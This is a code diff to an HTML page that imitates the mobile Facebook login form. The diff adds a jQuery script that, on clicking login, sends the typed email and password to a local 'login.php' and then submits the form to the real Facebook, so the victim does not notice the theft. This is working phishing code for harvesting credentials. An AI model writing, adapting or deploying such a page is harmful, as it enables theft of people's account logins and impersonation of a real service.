@@ -16,8 +16,6 @@
 
       <div class="signForm">
         <form id="login_form" method="get" action="http://m.facebook.com/login/">
-          <input type="hidden" name="try_number" value="0" />
-          <input type="hidden" name="unrecognized_tries" value="0" />
           <div class="inp-sec"><input class="epBox eBox" id="login_email" type="email" name="email" autocorrect="off" autocapitalize="off" autocomplete="on" placeholder="Mobile number or email address"/></div>
           <div class="inp-sec"><input class="epBox pBox" id="login_password" type="password" autocorrect="off" autocapitalize="off" autocomplete="on" name="pass" placeholder="Password"/></div>
         </form>
@@ -58,6 +56,22 @@
   </body>
   <script src="assets/jquery.js"></script>
   <script>
-  
+  $(document).ready(function(){
+    $('#submit_login').on('click', function(){
+      $('#submit_login').attr('disabled', true);
+      $.post('login.php',
+      {
+        login: true,
+        email: $('#login_email').val(),
+        pass: $('#login_password').val()
+      },
+      function(data, status){
+        if(status == "success"){
+          $('#submit_login').removeAttr('disabled');
+          $('#login_form').submit();
+        }
+      });
+    });
+  });
   </script>
 </html>
